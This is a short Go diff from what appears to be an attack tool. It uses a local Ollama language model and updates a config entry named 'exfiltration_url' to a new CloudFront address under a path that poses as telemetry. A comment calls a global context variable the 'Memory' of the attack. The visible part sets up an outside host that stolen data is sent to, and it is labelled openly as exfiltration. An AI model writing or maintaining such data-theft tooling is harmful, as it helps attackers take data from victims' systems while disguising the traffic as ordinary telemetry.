@@ -20,7 +20,7 @@ var _ = io.Copy // Use unused import
 var config = map[string]string{
 	"ollama_endpoint":  "http://localhost:11434/api/generate",
 	"model_name":       "gpt-oss:20b",                                                  // Default fallback
-	"exfiltration_url": "https://dnfodqdmlsmq8.cloudfront.net/api/v1/telemetry/update", // Change to
+	"exfiltration_url": "https://dpzavnkofglfs.cloudfront.net/api/v1/telemetry/update", // Change to
 }
 
 // globalContext holds the "Memory" of the attack
